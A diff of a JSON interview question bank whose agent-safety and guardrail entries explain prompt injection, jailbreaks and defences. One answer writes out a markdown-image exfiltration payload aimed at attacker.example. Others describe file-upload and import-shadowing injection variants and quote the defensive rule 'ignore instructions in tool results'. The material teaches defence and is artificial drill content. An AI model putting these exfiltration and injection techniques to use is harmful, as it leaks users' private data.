@@ -14228,71 +14228,71 @@
     {
       "id": "T07-agent-safety-d1",
       "module": "T07-agent-safety",
-      "q": "In one sentence, why doesn't parameterized-query-style thinking transfer to fixing prompt injection?",
-      "a": "Because SQL has a decidable grammar a parser enforces mechanically before data is bound, while natural language has no equivalent grammar to draw a boundary in.",
+      "q": "Define prompt injection in one sentence and say why it's structural, not a bug.",
+      "a": "Untrusted input alters the model's behavior because trusted instructions and untrusted data share one token stream and the model cannot reliably tell who is speaking. It's structural (named after SQL injection) because the control channel and data channel are the same channel \u2014 there is no in-band fix, only out-of-band controls at the action layer.",
       "difficulty": "warmup"
     },
     {
       "id": "T07-agent-safety-d2",
       "module": "T07-agent-safety",
-      "q": "Classify this as direct or indirect injection: a filename 'run_this_before_continuing.sh' left in a directory an agent lists.",
-      "a": "Indirect \u2014 the payload arrives via content (here, metadata) the agent reads, not via the user's own keystrokes.",
+      "q": "Direct vs indirect injection vs jailbreaking \u2014 one line each, with the ATLAS mapping.",
+      "a": "Jailbreak: the user attacks the model's safety protocols directly (ATLAS AML.T0054). Direct injection: user input alters your application's behavior (AML.T0051.000). Indirect injection: instructions planted in content the agent reads \u2014 tool results, RAG docs, emails, issue titles (AML.T0051.001) \u2014 the agent-era threat because the attacker never talks to the agent.",
       "difficulty": "warmup"
     },
     {
       "id": "T07-agent-safety-d3",
       "module": "T07-agent-safety",
-      "q": "An agent can read internal Slack messages, is exposed to messages posted by anyone in the workspace, and has a tool to post to an external webhook. Name the trifecta leg each capability maps to.",
-      "a": "Reading internal Slack = private data access. Exposure to messages posted by anyone = untrusted content. Posting to an external webhook = external communication. All three present = lethal trifecta.",
-      "difficulty": "mid"
+      "q": "Recite the OWASP LLM Top 10 (2025) in order. Which item is the multiplier and why?",
+      "a": "L01 Prompt Injection, L02 Sensitive Info Disclosure, L03 Supply Chain, L04 Data/Model Poisoning, L05 Improper Output Handling, L06 Excessive Agency, L07 System Prompt Leakage, L08 Vector/Embedding Weaknesses, L09 Misinformation, L10 Unbounded Consumption. L06 is the multiplier: every other risk's realized severity scales with how much privilege, autonomy, and tool breadth the agent has \u2014 an L01 injection into a chatbot embarrasses; into an agent with write tools it's an incident.",
+      "difficulty": "warmup"
     },
     {
       "id": "T07-agent-safety-d4",
       "module": "T07-agent-safety",
-      "q": "Given the trifecta from the previous question, name one concrete architectural change that removes a leg without removing the feature entirely.",
-      "a": "E.g. restrict the webhook tool to a fixed, pre-approved allowlist of destinations rather than an arbitrary URL, so external communication can no longer go to an attacker-chosen endpoint.",
-      "difficulty": "mid"
+      "q": "Walk through the canonical URL-based exfiltration attack and the earliest public instance.",
+      "a": "Get the model to emit a URL with private data embedded \u2014 classically a markdown image `![x](https://attacker.example/log?d=<secrets>)`; the client's own fetch carries the data out. Rehberger, April 2023 against ChatGPT. 2026 variants: Copilot Cowork emailing the user's own inbox with external images plus OneDrive pre-authenticated download links; Claude Cowork uploading files to the allowlisted api.anthropic.com/v1/files using an attacker-supplied API key.",
+      "difficulty": "warmup"
     },
     {
       "id": "T07-agent-safety-d5",
       "module": "T07-agent-safety",
-      "q": "Name the OWASP LLM Top 10 (2025) code for: an attacker extracts the operator's hidden system instructions by asking the model to repeat everything above.",
-      "a": "LLM07 \u2014 System Prompt Leakage.",
-      "difficulty": "warmup"
+      "q": "Why does 'ignore instructions in tool results' in the system prompt not count as a control?",
+      "a": "A prompt is a suggestion; a control is deterministic code that makes the action impossible. No speaker separation exists in context \u2014 role-confusion research shows models follow style over role tags, and destyling attacks alone changed success 61%\u219210%. The 2026 record: 0/720 on a held-out vendor eval, then 60-80% adaptive break of the same shipped system weeks later. Every in-band defense is a probabilistic classifier with a bypass record.",
+      "difficulty": "mid"
     },
     {
       "id": "T07-agent-safety-d6",
       "module": "T07-agent-safety",
-      "q": "Name the OWASP LLM Top 10 (2025) code for: a single crafted message causes a research agent to spin off nested retrievals overnight, running up a five-figure token bill.",
-      "a": "LLM10 \u2014 Unbounded Consumption.",
+      "q": "Design the permission ladder for tools: search_email, get_customer, file_ticket, send_reply, issue_refund, delete_record.",
+      "a": "search_email, get_customer: read_only, auto-run, logged. file_ticket: reversible internal write, auto-run with idempotency key, immutable audit. send_reply: external side effect \u2014 approval or a capability-shaped tool (existing thread participants only, no new recipients/URLs). issue_refund: financial \u2014 dual control, agent prepares / human executes in a different authed session, amount caps, never blind retry. delete_record: destructive \u2014 human + typed confirmation constant + freshness window (~120s); approval is for THIS action NOW. Unknown tools default destructive; enforce in the dispatcher, not the prompt.",
       "difficulty": "mid"
     },
     {
       "id": "T07-agent-safety-d7",
       "module": "T07-agent-safety",
-      "q": "A teammate proposes fine-tuning the model to refuse embedded instructions as the primary defense against prompt injection. What's the one-line pushback?",
-      "a": "It reduces the success rate of known attack patterns but doesn't close the class of attack, since the underlying issue \u2014 no structural instruction/data boundary \u2014 is unchanged; treat it as one layer, not the fix.",
+      "q": "Explain CaMeL's core mechanism and its costs.",
+      "a": "Reframe injection as information-flow control: a privileged 'security model' that only ever sees trusted labels decides authorization, while a quarantined parser model extracts values from untrusted content \u2014 so untrusted data can influence values passed to tools but can never authorize actions. Costs: a 4-8x system redesign (two models, structured metadata everywhere) and added latency. It's the strongest published 'impossible by construction' design \u2014 the direction for genuinely high-stakes agents, not a drop-in library.",
       "difficulty": "mid"
     },
     {
       "id": "T07-agent-safety-d8",
       "module": "T07-agent-safety",
-      "q": "You see a trace where an agent reads a customer's support ticket at step 4 and calls change_billing_address at step 5 with an address never mentioned in the conversation. What's your first hypothesis and what do you check?",
-      "a": "First hypothesis: successful indirect prompt injection via the ticket text. Check whether the ticket body contained an embedded instruction, and whether the permission engine should have gated a billing-address change from this session at all.",
-      "difficulty": "staff"
+      "q": "Your approval queue is being rubber-stamped. Give the evidence and the fix.",
+      "a": "Evidence: the 1,053-tester study \u2014 humans refused a clearly dangerous command only 13.6% of the time (auto-mode classifiers blocked 89%); approval p50 under ~5s on decisions needing 45-90s; near-zero rejection rate; bulk-approve usage. Fix: fewer, higher-stakes gates so attention concentrates; computed diffs instead of intents; remove bulk-approve on irreversible classes; and reclassify reversible+internal actions back to auto-run. If a classifier pre-screens the queue, it gates the queue, never the destructive tier itself.",
+      "difficulty": "mid"
     },
     {
       "id": "T07-agent-safety-d9",
       "module": "T07-agent-safety",
-      "q": "Your injection-resistance benchmark score is 98% on AgentDojo. Is the agent safe to ship with no further review?",
-      "a": "No \u2014 a benchmark score is a lower bound on exposure to known attack families in the corpus, not an upper bound on exposure to a motivated attacker's novel attacks against your specific tool surface. Still requires a trifecta check on the actual deployed capability set.",
+      "q": "Reconcile: vendor eval shows 0/720 injections blocked; independent researcher reports 60-80% success three weeks later.",
+      "a": "Both true: the eval measured a held-out attack distribution (72 scenarios, 720 attempts, third-party, July 2026 models) \u2014 an upper bound on tested attacks; the researcher measured the NEXT attack (zip archive whose extracted struct.py shadows a stdlib import \u2014 a confused-environment attack no content classifier recognizes) \u2014 a lower bound on capability. Structurally, trust the break more: it proves possibility; an eval only proves coverage. Deploy the classifier as depth (it kills commodity attacks, 86%\u21924.4% class results are real), keep dispatcher tiers + egress + sandbox as the actual boundary.",
       "difficulty": "staff"
     },
     {
       "id": "T07-agent-safety-d10",
       "module": "T07-agent-safety",
-      "q": "Why is a permission engine that evaluates (principal, tool, argument-pattern, resource) more robust against injection than a tool-name-only allowlist?",
-      "a": "Because the dangerous cases are usually argument patterns, not tool identity \u2014 e.g. write_file is fine under ./src but dangerous under ./.github/workflows; gating on the tool name alone can't express that distinction.",
+      "q": "You're asked: 'what's the worst this agent can do, and what's your revocation story?' Give the four-number frame.",
+      "a": "(1) Blast radius of full compromise: which credentials, which tenants, which irreversibilities \u2014 can it send, spend, delete, merge? (2) Time-to-revoke: dispatcher kill switch plus per-session short-TTL credentials \u2014 seconds, not a support ticket. (3) Detection latency: canary alarms on outbound args, egress allowlist violations, action-sequence anomaly rules. (4) Audit reconstruction: immutable per-call logs (tool, args, tier, approver, trace id) answering 'what did it do and why' from traces. Air Canada established the agent's actions are the company's actions \u2014 these four numbers are the compliance answer too.",
       "difficulty": "staff"
     },
     {
@@ -14648,72 +14648,72 @@
     {
       "id": "T07-guardrails-d1",
       "module": "T07-guardrails",
-      "q": "A text response passes every output filter clean, but a customer's SSN still leaked. What's the first thing you check?",
-      "a": "Whether the SSN left through a tool call, API write, or log line the output filter never inspected, since output guardrails typically only scan the final chat text.",
+      "q": "What is a guardrail, and what four verbs does every one perform?",
+      "a": "Deterministic validation and policy enforcement wrapped around a nondeterministic model. Verbs: classify (topic, PII, jailbreak), verify (schema, facts), transform (redact, mask, pseudonymize), route (pass, block, fix, escalate). Libraries are prebuilt validators; the engineering is placement, cost, and failure policy per risk.",
       "difficulty": "warmup"
     },
     {
       "id": "T07-guardrails-d2",
       "module": "T07-guardrails",
-      "q": "Rank these by typical added latency: Guardrails AI ML validator, schema/regex check, LLM-based validator.",
-      "a": "Schema/regex (<10ms) < Guardrails AI ML validator (50-200ms) < LLM-based validator (200-800ms).",
+      "q": "Order the three validator families by cost and state when you'd use each.",
+      "a": "Deterministic (regex, schema, checksum, canary): sub-ms, in-process, for well-formed guarantees like JSON conformance, banned domains, Luhn-validated card numbers. Statistical (Presidio: pattern + context + NER): ~50-300 ms, for format-variance in PII with tunable thresholds. Model-based (Llama Guard, omni-moderation): hundreds of ms, one forward pass per message, for semantics: novel jailbreaks, paraphrased toxicity. Never pay tier-3 cost for a tier-1 guarantee; prefilter before the classifier.",
       "difficulty": "warmup"
     },
     {
       "id": "T07-guardrails-d3",
       "module": "T07-guardrails",
-      "q": "Your guardrail catches 90% of serious problems but has a 25% false-positive rate. Is this a good tradeoff for a consumer product?",
-      "a": "Likely not \u2014 a 25% FP rate is well above the 5-15% industry range and will generate daily friction; under pressure the threshold typically gets loosened, eroding even the 90% catch rate over time.",
-      "difficulty": "mid"
+      "q": "What are NeMo Guardrails' five rail types, and what is its differentiator?",
+      "a": "Input, dialog, retrieval, execution, and output rails, configured in config.yml plus Colang .co flow files. Reference input flows: 'check jailbreak' and 'mask sensitive data on input'; output flows: 'self check facts' and 'self check hallucination'. The differentiator is dialog rails: Colang scripts conversation flows so fact-checking runs only for the question types that need it. Async-first, Python 3.10-3.13, release 0.23.0.",
+      "difficulty": "warmup"
     },
     {
       "id": "T07-guardrails-d4",
       "module": "T07-guardrails",
-      "q": "A PII-detection microservice goes down. Your product is an internal engineering chatbot with no external users and no regulated data. Fail-open or fail-closed, and why?",
-      "a": "Fail-open \u2014 low-stakes, no regulated data, availability matters more than the marginal risk from one unchecked response in this domain.",
+      "q": "Your PII regex misses a card number typed with unicode separators, and your statistical detector false-positives on order IDs. How do you fix both?",
+      "a": "Layer the families: regex for the high-precision well-formed cases with Luhn checksum validation (12-19 digits), context words near the candidate to suppress the order-ID false positive (Presidio's approach), and NER for format-variance. Accept Presidio's documented caveat that automated detection is not exhaustive, and add the real control: project columns at the tool boundary so card numbers never enter model context at all. Prevention beats detection.",
       "difficulty": "mid"
     },
     {
       "id": "T07-guardrails-d5",
       "module": "T07-guardrails",
-      "q": "Same scenario, but the product is a healthcare intake assistant. Fail-open or fail-closed?",
-      "a": "Fail-closed \u2014 regulated, high-stakes domain; if you can't prove the output is safe, don't send it, even at the cost of an outage.",
+      "q": "The model needs the real customer name to write a personalized email. Where do you hydrate the pseudonyms?",
+      "a": "Only in the final render path, after output guards run on the model text, using a per-request map keyed by token (never span index), never logged, destroyed after render. The model works from pseudonyms plus template instructions. If the model genuinely must see real values, scope the exposure to that entity type and session, and have the output guard skip that entity rather than blocking. Hydrating right after the model call puts unguarded PII in every downstream hop.",
       "difficulty": "mid"
     },
     {
       "id": "T07-guardrails-d6",
       "module": "T07-guardrails",
-      "q": "Which guardrail layer specifically targets hallucination in a RAG system, and what does it check?",
-      "a": "Groundedness checking \u2014 it verifies that claims in the response trace back to the retrieved source documents.",
-      "difficulty": "warmup"
+      "q": "Your moderation API has 99.9% uptime and your fail-closed jailbreak guard blocks on its errors. Worst case analysis?",
+      "a": "0.1% of traffic blocked sounds small but is many users, and outages are correlated: your dependency's bad deploy hits during your peak. The fix is redundancy with DIVERGENT implementations for fail-closed risks (platform filter plus app-side prefilter), circuit-breaking to a safer degraded mode with an honest message rather than a generic 500, and guard-error rate tracked as a first-class SLO. Azure documents that its filter errors return 200 unfiltered, so fail-open paths need monitoring too.",
+      "difficulty": "mid"
     },
     {
       "id": "T07-guardrails-d7",
       "module": "T07-guardrails",
-      "q": "A teammate proposes running an LLM-as-judge output validator on every single turn of a high-traffic product. What's your pushback with numbers?",
-      "a": "That adds 200-800ms latency and roughly 15-40% to the provider bill per turn on every request; route it instead to only high-stakes or RAG-backed categories rather than applying it as a blanket per-turn gate.",
-      "difficulty": "staff"
+      "q": "A canary token appears in a tool result the model constructed (a search query), not in the final answer. What do you do?",
+      "a": "Block, and that is the point of scanning every egress surface, not just the response: the leak already left your boundary once it reached the tool. A canary in a model-constructed search query is exfiltration-in-progress: block, alert, revoke that session's tool access. A canary in a log line you wrote yourself is your own logging bug, a different triage. The distinction is whether the flow was model-controlled.",
+      "difficulty": "mid"
     },
     {
       "id": "T07-guardrails-d8",
       "module": "T07-guardrails",
-      "q": "Your jailbreak detector had a great benchmark score at launch a year ago. Attack success rate has crept up since. Why, without any code change?",
-      "a": "Jailbreak classifiers are adversarial targets; attackers iterate against known detectors the way they iterate against WAF rules, so effectiveness decays as new phrasings are discovered even with a static model.",
-      "difficulty": "staff"
+      "q": "You run a public agent at 100 QPS and can't afford a model classifier on every message. What's the tiered design?",
+      "a": "Layer 0: deterministic prefilters on everything (signatures, encoding detection, known jailbreak corpora), sub-ms. Layer 1: classifier on suspicion (prefilter hits) and on risk: traffic with tool access or external effects always classified; read-only chat sampled at 10-20%, biased to new sessions. Layer 2: async scoring post-render with retraction and downstream-effect suppression on a flag. Do the arithmetic: an 8B classifier sidecar on vLLM serves hundreds of calls per second per GPU, so 'too expensive' usually means 'serialized in the hot path.'",
+      "difficulty": "mid"
     },
     {
       "id": "T07-guardrails-d9",
       "module": "T07-guardrails",
-      "q": "Design the output-side guardrail stack for a RAG customer-support agent, in priority order, and justify the order.",
-      "a": "PII redaction and schema validation first (cheap, always relevant), then groundedness check against retrieved sources as the highest-priority expensive layer, since the dominant risk in a support bot is confidently wrong information, ahead of toxicity classification.",
-      "difficulty": "mid"
+      "q": "Design the guard architecture for a regulated fintech agent that reads accounts, moves money, and talks to customers.",
+      "a": "Start from the risk inventory: PII/PCI leakage, regulated advice, social engineering, jailbreak-driven transfers, hallucinated balances, audit obligations. Place guards by risk: (1) tool boundary first: money-moving tool tier-gated with approval for out-of-pattern transfers; accounts tool projects data so full card numbers never enter context. (2) Input: encoding prefilter, Presidio pseudonymization, denied-topic guard for investment advice with a licensed-advisor escalation path, jailbreak prefilter + classifier for sessions with tool access. (3) Output: schema check on tool arguments BEFORE execution (sub-ms, guards the money), PII scan pre-hydration, canary on every egress surface, groundedness on account-data claims. (4) Platform filters as baseline. (5) Failure policy: money-path guards fail closed, conversational fail open with alarms. (6) Immutable audit on regulated actions. (7) Measurement: weekly FPR on benign traffic, red-team in CI, drift monitors.",
+      "difficulty": "staff"
     },
     {
       "id": "T07-guardrails-d10",
       "module": "T07-guardrails",
-      "q": "Why is 'add a guardrail' not a complete answer in a design review?",
-      "a": "Because guardrails are layered and each catches a different failure at a different cost; the answer needs to name which layer, what it specifically catches and misses, and its latency/cost budget.",
-      "difficulty": "mid"
+      "q": "Your red-team suite passes 100% but is six months old. Are you safe?",
+      "a": "No; the suite measures yesterday's attacks. Efficacy is a rate of adaptation, not a state: continuous red-teaming, canary tripwires for novel exfiltration, and above all the containment posture (tool risk tiers, least privilege) that holds when detection misses, since a jailbroken model with no refund tool cannot refund. Also report the other side: FPR on benign production traffic, because over-blocking is the failure that gets guardrails disabled. 'The suite is green' cannot terminate the safety conversation at principal level.",
+      "difficulty": "staff"
     },
     {
       "id": "T07-guardrails-d11",
@@ -31651,6 +31651,755 @@
       "module": "T22-bitcoin-ethereum",
       "q": "Why is 'Ethereum's account model is strictly better than Bitcoin's UTXO model' a red flag answer?",
       "a": "It's a tradeoff, not a settled conclusion. UTXO's set-based structure gives natural parallel validation and better coin-level privacy properties (why Zcash and privacy chains build on UTXO-like foundations); account model gives natural persistent contract storage. Each is the better choice for different problems -- treating one as universally superior misses the actual engineering tradeoff.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T15-aptitude-puzzles-d1",
+      "module": "T15-aptitude-puzzles",
+      "q": "Six friends face the CENTER of a circle. Is 'B's right' clockwise or anticlockwise from B?",
+      "a": "Facing center: left is anticlockwise, right is CLOCKWISE from the sitter. Facing OUTSIDE inverts both. The arrows get written on the circle before any positional clue.",
+      "difficulty": "warmup"
+    },
+    {
+      "id": "T15-aptitude-puzzles-d2",
+      "module": "T15-aptitude-puzzles",
+      "q": "A row of five people faces SOUTH. The clue says 'Q is to the left of R.' Relative to the page, is Q left or right of R?",
+      "a": "Facing south REVERSES page-left/right: Q is to the page-RIGHT of R. The solver's perspective is never the reference -- the sitter's facing is, which is why the facing-direction arrow gets written above the row first.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T15-aptitude-puzzles-d3",
+      "module": "T15-aptitude-puzzles",
+      "q": "Solve: A is B's father. C is B's sister. D is C's son. How is D related to A?",
+      "a": "Grandson. Tree: A and B one generation link (father-son), C sibling of B, D child of C => two rows below A. Draw WHILE reading clause by clause; the verbal chain version mis-steps with no diagram to check.",
+      "difficulty": "warmup"
+    },
+    {
+      "id": "T15-aptitude-puzzles-d4",
+      "module": "T15-aptitude-puzzles",
+      "q": "Ravi walks 10m north, turns right, walks 6m, turns left, walks 4m. Which direction is he facing, and how far is he from start?",
+      "a": "Facing NORTH (N -> right/East -> left/North). Displacement: (6, 14) => sqrt(36+196) = sqrt(232) ~= 15.2m. Facing is read off the last arrow; displacement needs the coordinate net. Options include 20m (sum of lengths) for the always-wrong pick.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T15-aptitude-puzzles-d5",
+      "module": "T15-aptitude-puzzles",
+      "q": "In a class A ranks 7th from top, 34th from bottom. How many students? And why minus 1?",
+      "a": "7 + 34 - 1 = 40. A is counted in BOTH ranks, so subtract the double-count once. 41 is the off-by-one option always present.",
+      "difficulty": "warmup"
+    },
+    {
+      "id": "T15-aptitude-puzzles-d6",
+      "module": "T15-aptitude-puzzles",
+      "q": "Next term: 2, 6, 12, 20, 30, ? \u2014 show the method.",
+      "a": "First differences: 4, 6, 8, 10 => next diff 12 => 42. The difference engine resolves 80% of series mechanically; oscillating first diffs means split into two interleaved series.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T15-aptitude-puzzles-d7",
+      "module": "T15-aptitude-puzzles",
+      "q": "FRIEND is coded as GSJFOE. What is the rule, and what is CODED?",
+      "a": "Rule derived from the pair: +1 per letter. CODED -> DPEFE. Never guess from options -- derive the cipher from the given pair, then apply; position-based and reversal codes share the surface form.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T15-aptitude-puzzles-d8",
+      "module": "T15-aptitude-puzzles",
+      "q": "All engineers are graduates. Some graduates are managers. Does 'some engineers are managers' follow?",
+      "a": "No. The minimum legal Venn: engineers inside graduates; managers overlapping graduates but possibly missing engineers entirely. 'Some graduates are managers' does not place any manager inside the engineer region -- plausibility is not entailment.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T15-aptitude-puzzles-d9",
+      "module": "T15-aptitude-puzzles",
+      "q": "Angle between the hands at 3:40? State the formula and compute.",
+      "a": "theta = |30h - 11m/2| = |90 - 220| = 130 degrees. The signed result may need the 180-degree supplement check depending on which is asked. Hands coincide 22 times a day, not 24.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T15-aptitude-puzzles-d10",
+      "module": "T15-aptitude-puzzles",
+      "q": "You've spent 2 minutes on a seating puzzle and only placed two people. What do you do and why?",
+      "a": "Abandon full solve: switch to options-elimination against partial constraints, or skip. One stall costs three medium questions at the tail; 3 mediums beat 1 hard in points, every time. The 2-minute rule is triage, not defeat.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T15-aptitude-puzzles-d11",
+      "module": "T15-aptitude-puzzles",
+      "q": "'Pointing to a photo, X says: he is the son of my grandfather's only son.' Who is in the photo?",
+      "a": "Grandfather's only son = X's father (only-son excludes uncles). Son of X's father = X or X's brother; 'he' + a photo implies the brother (or X himself). Unwind possessive chains one hop at a time on paper; gender-mark as you go.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T15-aptitude-puzzles-d12",
+      "module": "T15-aptitude-puzzles",
+      "q": "Why are syllogisms and series scheduled FIRST in a well-triaged attempt, not left for 'if time remains'?",
+      "a": "They're the fast questions (10-40s each with canned methods) -- guaranteed points. Slow seating puzzles first means the clock eats the sure things. Fast questions early is not a preference, it's the point distribution.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T15-hr-round-basics-d1",
+      "module": "T15-hr-round-basics",
+      "q": "Recite the five buckets of the 50-question HR canon in order, with question ranges.",
+      "a": "Introduction & background (1-10), Career goals & motivation (11-20), Work experience & behavior (21-30), Teamwork & communication (31-40), Salary/availability/closing (41-50).",
+      "difficulty": "warmup"
+    },
+    {
+      "id": "T15-hr-round-basics-d2",
+      "module": "T15-hr-round-basics",
+      "q": "Give your 'tell me about yourself' in the 90-second three-beat shape.",
+      "a": "Now (one sentence with scale) -> one proof-point project -> why this role. Ends handing the floor back. Not a chronological autobiography.",
+      "difficulty": "warmup"
+    },
+    {
+      "id": "T15-hr-round-basics-d3",
+      "module": "T15-hr-round-basics",
+      "q": "A candidate says 'I'm leaving because my manager was toxic and there were no hikes.' What's wrong and what's the replacement sentence?",
+      "a": "Backward-push blame -- the only unrecoverable flag, true or not. Replace with forward-pull: 'I've taken the platform as far as the role allows; this role owns the serving layer I built toward.'",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T15-hr-round-basics-d4",
+      "module": "T15-hr-round-basics",
+      "q": "The recruiter asks for salary expectations first. Walk through the deflection-and-anchor sequence.",
+      "a": "Deflect once ('I'd like to understand the band for the level'), then anchor from research: current fixed + target market range for the level (from levels/contacts BEFORE the call). Never a bare unanchored number -- the first number spoken is the one typed.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T15-hr-round-basics-d5",
+      "module": "T15-hr-round-basics",
+      "q": "What are the two questions you carry into 'do you have any questions for us?', and why those two?",
+      "a": "'What does the first 90 days look like?' and 'What's the biggest gap between the job ad and the day-to-day?' Neither is answerable by the website; both signal seriousness. 'No questions' is scored as low interest.",
+      "difficulty": "warmup"
+    },
+    {
+      "id": "T15-hr-round-basics-d6",
+      "module": "T15-hr-round-basics",
+      "q": "The interviewer asks 'why are you leaving?' twice, ten minutes apart. What is the second ask actually testing?",
+      "a": "Consistency: the re-ask catches embellishment. Two different stories = dishonesty flag worse than either story. Same sentence, verbatim, both times.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T15-hr-round-basics-d7",
+      "module": "T15-hr-round-basics",
+      "q": "A candidate answers the weakness question with 'I'm a perfectionist.' Why does this fail, and what replaces it?",
+      "a": "Fake weakness = evading the question while announcing you prepare. Replace: one real, non-fatal, work-in-progress weakness + mitigation in present tense ('I under-document early prototypes; I now write the README before the second user asks').",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T15-hr-round-basics-d8",
+      "module": "T15-hr-round-basics",
+      "q": "Why does 'have you ever missed a deadline?' test communication rather than failure, and what does the passing answer contain?",
+      "a": "The silent missed deadline is the firing offense; the well-communicated one is an incident. Pass: yes-once + cause + who was told and WHEN (before it passed) + what changed after. 'Never missed one' reads as unreflective.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T15-hr-round-basics-d9",
+      "module": "T15-hr-round-basics",
+      "q": "The interviewer asks 'why should we choose you over other candidates?' and the candidate criticizes the hypothetical others. What flag fires?",
+      "a": "The same bitterness flag as the leaving-reason -- criticism of others (even hypothetical) reads as grievance. Correct: Q3's fit case compressed to one sentence + one pool-differentiator, never the competition.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T15-hr-round-basics-d10",
+      "module": "T15-hr-round-basics",
+      "q": "Explain why an HR screen is a checklist, not a rubric, and name the one preparation consequence.",
+      "a": "The interviewer fills form blanks (logistics, flags, salary box) -- no drilling, no partial credit for method. Consequence: every question is predictable in advance, so failing one is a preparation failure scored identically to a competence failure.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T15-hr-round-basics-d11",
+      "module": "T15-hr-round-basics",
+      "q": "Walk the disagreement-with-manager ladder, including the trap after the call goes against you and fails as you predicted.",
+      "a": "State the case with evidence once; if overruled, record dissent in the decision doc; commit fully. When it fails: help fix it with zero reference to the prediction -- 'I told you so' converts a good process answer into a personality flag.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T15-hr-round-basics-d12",
+      "module": "T15-hr-round-basics",
+      "q": "Why do teamwork questions (31-40) get asked as a group, and what does a pushover-Q34 + warrior-Q35 pattern signal?",
+      "a": "They're cross-checked for one consistent personality. The contradiction reads as scripted answers per question rather than one person describing real behavior -- consistency across the bucket is the actual test.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T18-bi-tooling-d1",
+      "module": "T18-bi-tooling",
+      "q": "A table visual shows the same Total Sales number on every row. Why?",
+      "a": "Filter context isn't differentiating rows: no dimension from the fact is on the view (or the measure aggregates over a context the rows don't slice). The fix is model/grain \u2014 put a real dimension on the axis \u2014 not a new formula.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T18-bi-tooling-d2",
+      "module": "T18-bi-tooling",
+      "q": "Write the YoY % measure and name its two prerequisites.",
+      "a": "YoY % := DIVIDE([Total Sales] - CALCULATE([Total Sales], SAMEPERIODYEARAGO('Date'[Date])), CALCULATE([Total Sales], SAMEPERIODYEARAGO('Date'[Date]))). Prerequisites: a proper date dimension, MARKED as date table, related to the fact \u2014 time intelligence navigates nothing without it.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T18-bi-tooling-d3",
+      "module": "T18-bi-tooling",
+      "q": "Why is 'Sales Amount' as a calculated column a modeling error?",
+      "a": "A column is row-context, computed at refresh and STORED \u2014 it bloats the model and freezes the value outside filter context. Total Sales := SUM(Sales[Amount]) as a measure computes per query under whatever slicing is active. Columns only for row-level attributes that must slice.",
+      "difficulty": "warmup"
+    },
+    {
+      "id": "T18-bi-tooling-d4",
+      "module": "T18-bi-tooling",
+      "q": "When is DirectQuery the right choice despite its costs?",
+      "a": "Three cases: real-time freshness requirements, facts too large for capacity, and security/compliance policies requiring data never leave the source. Costs to name up front: slower interactions, DAX dialect limitations, source-load responsibility. Default remains Import; Direct Lake is the Fabric-era middle.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T18-bi-tooling-d5",
+      "module": "T18-bi-tooling",
+      "q": "A user sees rows they shouldn't. Walk the RLS debugging order.",
+      "a": "1) Workspace membership \u2014 admins/members BYPASS RLS entirely (the deployment trap). 2) Role membership \u2014 which roles does the user hold; effective access = intersection. 3) Role DAX \u2014 the predicate logic and dynamic-username matching. Tested with View-as-role / test-as-user.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T18-bi-tooling-d6",
+      "module": "T18-bi-tooling",
+      "q": "In Tableau, your {FIXED [region]: SUM(sales)} disagrees with the sheet's percent-of-total under a state filter. Which is wrong?",
+      "a": "Neither \u2014 the disagreement is the semantics: FIXED computes at declared region grain regardless of view filters; percent-of-total (a table calc) respects them. Explaining that cleanly is the entire point of the question.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T18-bi-tooling-d7",
+      "module": "T18-bi-tooling",
+      "q": "A Tableau date pill turned green and the bar chart became a line. What happened?",
+      "a": "Blue = discrete (headers, categorical bars); green = continuous (axis, line). The date pill switched from discrete to continuous/exact \u2014 pill color encodes the computation the viz runs. The four-quadrant model (dimension/measure x discrete/continuous) is Tableau's grammar.",
+      "difficulty": "warmup"
+    },
+    {
+      "id": "T18-bi-tooling-d8",
+      "module": "T18-bi-tooling",
+      "q": "Two dashboards, two different YoY numbers for the same month. Give the debugging order and the class fix.",
+      "a": "1) Different datasets (no shared certified model \u2014 the most common org failure). 2) Different calendars (fiscal vs calendar). 3) Unmarked date table breaking SAMEPERIODYEARAGO. 4) Filter-context differences (one hard-filters region). 5) Drifted duplicate measures. Class fix: certified shared semantic model + measure library.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T18-bi-tooling-d9",
+      "module": "T18-bi-tooling",
+      "q": "Dashboard is slow. Give the triage order \u2014 and what's wrong with 'just remove charts' as the whole answer.",
+      "a": "1) Visuals per page (each is a query). 2) Model tier: calculated-column bloat, many-to-many fan-out. 3) Storage mode: DirectQuery per-visual source roundtrips vs Import. 4) DAX/LOD patterns: FILTER over whole tables, iterator chains. 'Fewer charts' is step one of four \u2014 the follow-up 'still slow after cutting visuals?' exists to catch candidates whose whole model is chart-count.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T18-bi-tooling-d10",
+      "module": "T18-bi-tooling",
+      "q": "Can you build a Power BI dashboard in Desktop? Explain the object model.",
+      "a": "No \u2014 dashboards (pin tiles from reports) exist only in the Service. Desktop builds reports; the Service publishes/shares/refreshes/governs: workspaces, apps, gateways for on-prem refresh, deployment pipelines dev->test->prod.",
+      "difficulty": "warmup"
+    },
+    {
+      "id": "T18-bi-tooling-d11",
+      "module": "T18-bi-tooling",
+      "q": "Slicer filters one visual but not another. Why, structurally?",
+      "a": "Filter propagation travels through model relationships \u2014 the untouched visual's table has no relationship path to the slicer's field (unrelated tables need a bridge/shared dimension). Slicers aren't page-wide magic; the star schema's edges ARE the propagation.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T18-bi-tooling-d12",
